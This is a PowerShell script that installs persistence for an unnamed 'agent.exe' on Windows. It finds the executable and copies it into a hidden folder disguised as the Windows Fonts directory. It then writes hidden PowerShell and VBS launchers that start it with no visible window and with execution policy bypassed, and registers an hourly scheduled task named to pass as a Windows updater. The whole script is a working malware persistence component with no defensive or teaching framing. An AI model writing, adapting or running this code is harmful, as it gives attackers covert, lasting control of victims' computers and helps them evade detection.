$ProgressPreference = 'Continue'
$ErrorActionPreference = 'Stop'

# -------------------------------------------------------------------
# Function to get the agent path automatically
# -------------------------------------------------------------------
function Get-AgentPath {
    # 1. Try environment variable first
    if ($env:AgentPath -and (Test-Path $env:AgentPath)) {
        Write-Output "[+] Using AgentPath from environment: $env:AgentPath"
        return $env:AgentPath
    }

    # 2. Find parent process (the agent that launched this PowerShell)
    try {
        $parentPid = (Get-CimInstance -Class Win32_Process -Filter "ProcessId=$pid" | Select-Object -ExpandProperty ParentProcessId)
        if ($parentPid) {
            $parentPath = (Get-Process -Id $parentPid -ErrorAction Stop).Path
            if ($parentPath -and (Test-Path $parentPath)) {
                Write-Output "[+] Detected agent as parent process: $parentPath"
                return $parentPath
            }
        }
    } catch { }

    # 3. Search for a running process named "agent.exe"
    $proc = Get-Process -Name "agent" -ErrorAction SilentlyContinue | Select-Object -First 1
    if ($proc) {
        $procPath = $proc.Path
        if ($procPath -and (Test-Path $procPath)) {
            Write-Output "[+] Found running agent.exe at: $procPath"
            return $procPath
        }
    }

    # 4. Search common locations
    $commonPaths = @(
        "$env:TEMP\agent.exe",
        "$env:LOCALAPPDATA\Microsoft\Windows\Fonts\agent.exe",
        "$env:APPDATA\agent.exe"
    )
    foreach ($path in $commonPaths) {
        if (Test-Path $path) {
            Write-Output "[+] Found agent at common location: $path"
            return $path
        }
    }

    Write-Output "ERROR: Could not locate agent executable."
    exit 1
}

# -------------------------------------------------------------------
# Main persistence installation
# -------------------------------------------------------------------
$agentPath = Get-AgentPath
Write-Output "[+] Using agent: $agentPath"

# --- 1. Hidden folder ---
$hideDir = "$env:LOCALAPPDATA\Microsoft\Windows\Fonts"
if (-not (Test-Path $hideDir)) {
    New-Item -ItemType Directory -Path $hideDir -Force | Out-Null
    attrib +h $hideDir
    Write-Output "[+] Created hidden folder: $hideDir"
}

# --- 2. Copy agent to hidden folder ---
$agentFile = "$hideDir\agent.exe"
if (Test-Path $agentFile) {
    Remove-Item -Path $agentFile -Force -ErrorAction SilentlyContinue
}
Copy-Item -LiteralPath $agentPath -Destination $agentFile -Force
if (-not (Test-Path $agentFile)) {
    Write-Output "ERROR: Failed to copy agent to $agentFile"
    exit 1
}
attrib +h $agentFile
Write-Output "[+] Agent copied to: $agentFile ($((Get-Item $agentFile).Length) bytes)"

# --- 3. Launcher script (just runs the exe) ---
$launcherPath = "$hideDir\run.ps1"
$launcherContent = @"
`$ProgressPreference = 'SilentlyContinue'
`$agentFile = '$agentFile'
Start-Process -WindowStyle Hidden -FilePath `$agentFile
"@
Set-Content -Path $launcherPath -Value $launcherContent -Encoding ASCII -Force
attrib +h $launcherPath

# --- 4. VBS launcher ---
$vbsPath = "$hideDir\run.vbs"
$vbsContent = @"
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -File ""$launcherPath""", 0, False
"@
Set-Content -Path $vbsPath -Value $vbsContent -Encoding ASCII -Force
attrib +h $vbsPath

# --- 5. Scheduled task: every 1 hour ---
$taskName = "WindowsUpdaterTaskHourly"
schtasks /delete /tn $taskName /f 2>$null
schtasks /create /tn $taskName /tr "wscript.exe `"$vbsPath`"" /sc hourly /mo 1 /ru $env:USERNAME /f /it
if ($LASTEXITCODE -eq 0) {
    Write-Output "✅ Scheduled task created (runs every 1 hour)."
    schtasks /run /tn $taskName 2>$null
    Write-Output "✅ Agent launched immediately."
} else {
    Write-Output "❌ Task creation failed with exit code $LASTEXITCODE"
    exit 1
}

Write-Output "`n✅ PERSISTENCE COMPLETE"
Write-Output "Agent location: $agentFile (hidden)"
Write-Output "Task: $taskName runs every hour"
